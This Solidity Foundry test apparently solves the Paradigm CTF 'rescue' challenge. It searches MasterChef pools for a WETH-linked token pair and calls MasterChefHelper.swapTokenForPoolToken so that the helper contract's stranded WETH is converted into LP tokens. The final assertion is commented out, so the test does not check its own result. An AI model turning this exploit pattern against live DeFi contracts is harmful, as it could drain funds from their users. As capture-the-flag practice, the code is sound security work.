// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/rescue/public/contracts/Setup.sol";
import "../src/rescue/public/contracts/MasterChefHelper.sol";
import "../src/rescue/public/contracts/UniswapV2Like.sol";


contract ContractTest is Test {
    mapping(address => bool) seen;
    address[] uniqueTokens;
    mapping(address => mapping(address => bool)) pairs;
    mapping(address => mapping(address => uint256)) poolIndexer;

    Setup setup;
    address weth;
    MasterChefHelper c;
    
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("paradigm"));
        setup = Setup(0x4601Ffa41A8CA767326d5804a392CfF8F8737bE3);
        weth = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        c = MasterChefHelper(setup.mcHelper());
    }

    function _swap(address tokenIn, address tokenOut, uint256 amountIn) internal {
        UniswapV2RouterLike router = UniswapV2RouterLike(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
        ERC20Like(tokenIn).approve(address(router), amountIn);
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        router.swapExactTokensForTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp + 300
        );
    }

    function extract(address tokenA, address tokenB) public {
        emit log_uint(ERC20Like(weth).balanceOf(address(c)) / 1e18);
        WETH9 weth9 = WETH9(weth);
        uint256 poolId = poolIndexer[tokenA][weth];
        emit log_uint(poolId);

        for (uint z=0; z < 1; z++) {
            weth9.deposit{value: 250 ether}();
            _swap(weth, tokenB, weth9.balanceOf(address(this))/2);
            _swap(weth, tokenA, weth9.balanceOf(address(this)));
            _swap(tokenA, tokenB, ERC20Like(tokenA).balanceOf(address(this)));

            address tokenIn = tokenB;  // any valid ERC20 could be used here, we know for a fact WETH is one of them
            uint256 amountIn = ERC20Like(tokenB).balanceOf(address(this));  // we got no tokens ourselves!
            uint256 minAmountOut = 0;  // avoids revert
            ERC20Like(tokenIn).approve(address(c), type(uint256).max);
            c.swapTokenForPoolToken(poolId, tokenIn, amountIn, minAmountOut);

            emit log_uint(ERC20Like(weth).balanceOf(address(c)) / 1e18);
            emit log_uint(ERC20Like(weth).balanceOf(address(c)));
        }
    }

    function testExploit() public {


        // Solution:
        //   win condition: weth.balanceOf(MasterChefHelper) == 0
        //   MasterChefHelper._addLiquidity will convert the contract's LP underlying into an LP
        //   therefore, we just need to call swapTokenForPoolToken() such that it converts existing WETH into an LP
        //   so realistically we just need to find a pool that uses WETH as one of its tokens

        // find a tokenA that trades to WETH
        // find a tokenB that trades to tokenA
        // find an LP that trades WETH / tokenA

        // crawl the pools looking for a pair that is mapped to WETH
        uint256 SEARCH_LIMIT = 29;  // how many masterchef.poolInfos we should check. arbitrary value
        address lpToken;
        address tokenOut0;
        address tokenOut1;
        for (uint256 i = 0; i < SEARCH_LIMIT; i++) {
            (lpToken,,,) = c.masterchef().poolInfo(i);
            tokenOut0 = UniswapV2PairLike(lpToken).token0();
            tokenOut1 = UniswapV2PairLike(lpToken).token1();
            pairs[tokenOut0][tokenOut1] = true;
            pairs[tokenOut1][tokenOut0] = true;
            poolIndexer[tokenOut0][tokenOut1] = i;
            poolIndexer[tokenOut1][tokenOut0] = i;

            if (seen[tokenOut0] == false) {
                uniqueTokens.push(tokenOut0);
                seen[tokenOut0] = true;
            }
            if (seen[tokenOut1] == false) {
                uniqueTokens.push(tokenOut1);
                seen[tokenOut1] = true;
            }            
        }

        address tokenA;
        address tokenB;
        bool found = false;
        for (uint256 a = 0; a < uniqueTokens.length; a++) {
            for (uint256 b = 0; b < uniqueTokens.length; b++) {
                // found a pair that trades to between each other
                if (pairs[uniqueTokens[a]][uniqueTokens[b]] == true) {
                    if (
                        pairs[uniqueTokens[a]][weth] == true
                        && pairs[weth][uniqueTokens[b]] == true
                    ) {
                        tokenA = uniqueTokens[a];
                        tokenB = uniqueTokens[b];
                        found = true;
                        break;
                    }
                }
            }
            if (found) break;
        }
        
        emit log_address(tokenA);
        emit log_address(tokenB);

        extract(tokenA, tokenB);

        // sneaky win condition: MasterChefHelper does not hold WETH :)
        //assertEq(ERC20Like(weth).balanceOf(address(c)), 0);
    }
}
